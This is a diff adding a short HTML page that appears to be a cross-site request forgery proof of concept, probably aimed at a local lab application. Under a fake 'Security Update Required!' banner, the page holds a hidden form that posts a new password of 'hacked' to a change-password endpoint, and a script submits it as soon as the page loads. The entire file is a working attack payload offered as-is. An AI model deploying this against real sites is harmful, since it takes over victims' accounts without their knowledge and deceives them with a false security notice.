@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <h3>Security Update Required! Please wait...</h3>
+
+    <form action="http://localhost:9001/change_password.php" method="POST">
+        <input type="hidden" name="new_password" value="hacked">
+        <input type="submit" value="Update">
+    </form>
+
+    <script>
+        document.forms[0].submit(); // auto-submit
+    </script>
+</body>
+
+</html>
